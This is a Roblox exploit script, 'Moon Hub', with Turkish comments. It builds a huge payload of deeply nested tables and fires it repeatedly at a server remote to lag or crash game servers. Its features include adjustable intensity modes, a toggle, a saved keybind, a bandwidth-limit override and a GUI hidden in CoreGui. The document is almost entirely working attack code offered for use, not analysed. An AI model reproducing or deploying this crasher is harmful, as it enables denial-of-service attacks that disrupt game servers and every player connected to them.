-- // 1 (Services) //
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

-- // 2 (Player + mobile detect) //
local player = Players.LocalPlayer
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- // 3 (Lagger Modları ve Dinamik Config) //
local MOD_CONFIGS = {
	LOW = { TableIncrease = isMobile and 150 or 120, Tries = 1, LoopWaitTime = 0.4 },
	MID = { TableIncrease = isMobile and 290 or 265, Tries = 1, LoopWaitTime = isMobile and 0.85 or 0.05 },
	HIGH = { TableIncrease = isMobile and 400 or 380, Tries = 2, LoopWaitTime = 0.01 }
}

local currentMod = "MID" -- Varsayılan mod
local LAGGER_CONFIG = MOD_CONFIGS[currentMod]

local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

-- // 4 (Remote resolver) //
local function resolveRemote(path)
	if not path or path == "" then return nil end
	local obj = game
	local cleaned = path:gsub("^game%.", "")
	for segment in cleaned:gmatch("[^%.]+") do
		if obj then
			obj = obj[segment]
		else
			return nil
		end
	end
	return obj
end

-- // 5 (Bomb builder) //
local function getmaxvalue(val)
	local mainvalueifonetable = 499999
	if type(val) ~= "number" then return nil end
	return mainvalueifonetable / (val + 2)
end

local function bomb(tableincrease, tries)
	local maintable = {}
	local spammedtable = {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for i = 1, tableincrease do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	local maximum = getmaxvalue(tableincrease) or 9999999
	for i = 1, maximum do
		table.insert(maintable, spammedtable)
		if i % 5000 == 0 then task.wait() end
	end
	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
	if remote then
		for i = 1, tries do
			pcall(function()
				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
					remote:FireServer(maintable)
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer(maintable)
				end
			end)
		end
	end
end

-- // 6 (Lagger state + control) //
local laggerEnabled = false
local laggerThread = nil

local function startLaggerLoop()
	while laggerEnabled do
		pcall(function()
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
		end)
		task.spawn(function()
			bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
		end)
		task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.01))
	end
end

local function stopLaggerLoop()
	laggerEnabled = false
	if laggerThread then
		pcall(function() coroutine.close(laggerThread) end)
		laggerThread = nil
	end
end

local function startLagger()
	if laggerThread then return end
	laggerEnabled = true
	laggerThread = coroutine.create(startLaggerLoop)
	coroutine.resume(laggerThread)
end

-- // 7 (Strip textures for performance) //
for _, v in pairs(workspace:GetDescendants()) do
	if v:IsA("Texture") or v:IsA("Decal") then
		v:Destroy()
	elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
		v.Material = Enum.Material.SmoothPlastic
	end
end

-- // 8 (Cleanup + HiddenUI folder) //
if not CoreGui:FindFirstChild("HiddenUI") then
	local f = Instance.new("Folder")
	f.Name = "HiddenUI"
	f.Parent = CoreGui
end
if CoreGui.HiddenUI:FindFirstChild("CrasherUI_Toggle") then
	CoreGui.HiddenUI.CrasherUI_Toggle:Destroy()
end

-- // 9 (ScreenGui) //
local gui = Instance.new("ScreenGui")
gui.Name = "CrasherUI_Toggle"
gui.ResetOnSpawn = false
gui.Parent = CoreGui.HiddenUI

-- // 10 (Animated gradient stroke helper) //
local function createAnimatedStroke(parent, thickness, speed)
	local s = Instance.new("UIStroke")
	s.Thickness = thickness or 1.5
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Color = Color3.new(1, 1, 1)
	s.Parent = parent

	local g = Instance.new("UIGradient")
	g.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 50, 90)),
		ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 200, 0)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.6, Color3.fromRGB(255, 200, 0)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 50, 90)),
	})
	g.Rotation = 0
	g.Parent = s

	task.spawn(function()
		local spd = speed or 1.2
		while parent.Parent do
			g.Rotation = (g.Rotation + spd) % 360
			task.wait()
		end
	end)

	return s, g
end

-- // 11 (Main frame — Koyu Lacivert/Mavi Tema) //
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 200, 0, 165) -- Butonlar için dikey boyutu büyüttük
main.Position = UDim2.new(0.5, -100, 0.5, -82)
main.BackgroundColor3 = Color3.fromRGB(10, 14, 28) -- Saf koyu lacivert tonu
main.BackgroundTransparency = 0.2
main.ClipsDescendants = true
main.Active = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

createAnimatedStroke(main, 2, 0.8)

-- // 12 (Title - Moon Hub) //
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.Text = "Moon Hub"
title.Font = Enum.Font.GothamBlack
title.TextSize = 16
title.TextColor3 = Color3.new(1, 1, 1)
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 200, 0)),
})
titleGrad.Parent = title

task.spawn(function()
	while main.Parent do
		titleGrad.Rotation = (titleGrad.Rotation + 1.2) % 360
		task.wait()
	end
end)

-- // 13 (Minimize button) //
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 24, 0, 24)
minBtn.Position = UDim2.new(1, -32, 0, 8)
minBtn.BackgroundColor3 = Color3.fromRGB(20, 26, 48)
minBtn.AutoButtonColor = false
minBtn.Font = Enum.Font.GothamBlack
minBtn.Text = "-"
minBtn.TextSize = 14
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.Parent = main

Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

local minimized = false
minBtn.MouseButton1Click:Connect(function()
	minimized = not minimized
	TweenService:Create(main, TweenInfo.new(0.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
		Size = minimized and UDim2.new(0, 200, 0, 40) or UDim2.new(0, 200, 0, 165)
	}):Play()
	minBtn.Text = minimized and "+" or "-"
end)

-- // 14 (Toggle row — Lagger) //
local toggleRow = Instance.new("Frame")
toggleRow.Size = UDim2.new(1, -20, 0, 32)
toggleRow.Position = UDim2.new(0, 10, 0, 40)
toggleRow.BackgroundColor3 = Color3.fromRGB(18, 24, 45)
toggleRow.Parent = main

Instance.new("UICorner", toggleRow)
createAnimatedStroke(toggleRow, 1, 1.2)

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Size = UDim2.new(1, -60, 1, 0)
toggleLabel.Position = UDim2.new(0, 10, 0, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Text = "Lagger"
toggleLabel.Font = Enum.Font.GothamBlack
toggleLabel.TextSize = 12
toggleLabel.TextColor3 = Color3.new(1, 1, 1)
toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
toggleLabel.Parent = toggleRow

-- // 15 (Toggle switch) //
local switchBg = Instance.new("Frame")
switchBg.Size = UDim2.new(0, 36, 0, 18)
switchBg.Position = UDim2.new(1, -46, 0.5, -9)
switchBg.BackgroundTransparency = 1
switchBg.Parent = toggleRow

Instance.new("UICorner", switchBg).CornerRadius = UDim.new(0, 9)
createAnimatedStroke(switchBg, 2, 1.5)

local switchKnob = Instance.new("Frame")
switchKnob.Size = UDim2.new(0, 14, 0, 14)
switchKnob.Position = UDim2.new(0, 2, 0.5, -7)
switchKnob.BackgroundColor3 = Color3.new(1, 1, 1)
switchKnob.Parent = switchBg

Instance.new("UICorner", switchKnob).CornerRadius = UDim.new(0, 7)

local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(1, 0, 1, 0)
toggleBtn.BackgroundTransparency = 1
toggleBtn.Text = ""
toggleBtn.Parent = toggleRow

local function setToggle(newState)
	laggerEnabled = newState
	local goal = newState and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
	local color = newState and Color3.fromRGB(30, 70, 150) or Color3.fromRGB(25, 30, 50)
	TweenService:Create(switchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
	TweenService:Create(switchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()

	if newState then
		startLagger()
	else
		stopLaggerLoop()
	end
end

toggleBtn.MouseButton1Click:Connect(function()
	setToggle(not laggerEnabled)
end)

-- // 16 (Keybind row) //
local kbRow = Instance.new("Frame")
kbRow.Size = UDim2.new(1, -20, 0, 32)
kbRow.Position = UDim2.new(0, 10, 0, 78)
kbRow.BackgroundColor3 = Color3.fromRGB(18, 24, 45)
kbRow.Parent = main

Instance.new("UICorner", kbRow)
createAnimatedStroke(kbRow, 1, 1.2)

local kbLabel = Instance.new("TextLabel")
kbLabel.Size = UDim2.new(1, -80, 1, 0)
kbLabel.Position = UDim2.new(0, 10, 0, 0)
kbLabel.BackgroundTransparency = 1
kbLabel.Text = "Keybind"
kbLabel.Font = Enum.Font.GothamBlack
kbLabel.TextSize = 12
kbLabel.TextColor3 = Color3.new(1, 1, 1)
kbLabel.TextXAlignment = Enum.TextXAlignment.Left
kbLabel.Parent = kbRow

local kbBtn = Instance.new("TextButton")
kbBtn.Size = UDim2.new(0, 60, 0, 20)
kbBtn.Position = UDim2.new(1, -68, 0.5, -10)
kbBtn.BackgroundColor3 = Color3.fromRGB(30, 38, 65)
kbBtn.AutoButtonColor = false
kbBtn.Font = Enum.Font.GothamBlack
kbBtn.Text = "[ -- ]"
kbBtn.TextSize = 10
kbBtn.TextColor3 = Color3.new(1, 1, 1)
kbBtn.Parent = kbRow

Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0, 5)

-- // 17 (JSON Keybind Save/Load) //
local boundKey = nil
local listeningForKey = false
local fileName = "moonhublagger.json"

local function saveKeybind(keyName)
	if writefile then
		local data = { Key = keyName }
		pcall(function()
			writefile(fileName, HttpService:JSONEncode(data))
		end)
	end
end

local function loadKeybind()
	if readfile and isfile and isfile(fileName) then
		local success, result = pcall(function()
			return HttpService:JSONDecode(readfile(fileName))
		end)
		if success and result and result.Key then
			local keyEnum = Enum.KeyCode[result.Key]
			if keyEnum then
				boundKey = keyEnum
				kbBtn.Text = "[ " .. result.Key .. " ]"
			end
		end
	end
end

kbBtn.MouseButton1Click:Connect(function()
	listeningForKey = true
	kbBtn.Text = "[ ... ]"
end)

UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if listeningForKey then
		if input.UserInputType == Enum.UserInputType.Keyboard then
			boundKey = input.KeyCode
			local keyName = tostring(input.KeyCode):sub(14)
			kbBtn.Text = "[ " .. keyName .. " ]"
			saveKeybind(keyName)
			listeningForKey = false
		end
		return
	end
	if boundKey and input.KeyCode == boundKey then
		setToggle(not laggerEnabled)
	end
end)

loadKeybind() -- Başlangıçta kayıtlı tuşu yükle

-- // 18 (LOW / MID / HIGH Modları Buton Alanı) //
local modeRow = Instance.new("Frame")
modeRow.Size = UDim2.new(1, -20, 0, 34)
modeRow.Position = UDim2.new(0, 10, 0, 116)
modeRow.BackgroundTransparency = 1
modeRow.Parent = main

local modeLayout = Instance.new("UIListLayout")
modeLayout.FillDirection = Enum.FillDirection.Horizontal
modeLayout.HorizontalAlignment = Enum.HorizontalAlignment.SpaceBetween
modeLayout.SortOrder = Enum.SortOrder.LayoutOrder
modeLayout.Parent = modeRow

local modeButtons = {}

local function updateModeUI()
	for name, btn in pairs(modeButtons) do
		local stroke = btn:FindFirstChildOfClass("UIStroke")
		if name == currentMod then
			btn.BackgroundColor3 = Color3.fromRGB(35, 50, 95)
			if stroke then stroke.Enabled = true end
		else
			btn.BackgroundColor3 = Color3.fromRGB(18, 24, 45)
			if stroke then stroke.Enabled = false end
		end
	end
end

local function createModeButton(name, order)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(0, 56, 1, 0)
	btn.BackgroundColor3 = Color3.fromRGB(18, 24, 45)
	btn.Font = Enum.Font.GothamBlack
	btn.Text = name
	btn.TextSize = 11
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.LayoutOrder = order
	btn.Parent = modeRow
	
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	
	-- Seçili olan butona özel parıltılı gold stroke ekleme altyapısı
	local s = Instance.new("UIStroke")
	s.Thickness = 1.2
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Color = Color3.fromRGB(255, 200, 0)
	s.Enabled = false
	s.Parent = btn
	
	btn.MouseButton1Click:Connect(function()
		currentMod = name
		LAGGER_CONFIG = MOD_CONFIGS[name]
		updateModeUI()
	end)
	
	modeButtons[name] = btn
end

createModeButton("LOW", 1)
createModeButton("MID", 2)
createModeButton("HIGH", 3)
updateModeUI() -- Başlangıç seçimi

-- // 19 (Draggable with screen clamp) //
do
	local dg, ds, sp = false, nil, nil

	local function clampPosition(pos)
		local ss = workspace.CurrentCamera.ViewportSize
		local gs = main.AbsoluteSize
		local x = math.clamp(pos.X.Offset, 0, math.max(0, ss.X - gs.X))
		local y = math.clamp(pos.Y.Offset, 0, math.max(0, ss.Y - gs.Y))
		return UDim2.new(0, x, 0, y)
	end

	main.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and not minimized then
			dg = true
			ds = input.Position
			sp = main.Position
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dg and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			if minimized then dg = false return end
			local delta = input.Position - ds
			main.Position = clampPosition(UDim2.new(sp.X.Scale, sp.X.Offset + delta.X, sp.Y.Scale, sp.Y.Offset + delta.Y))
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dg = false
		end
	end)
end
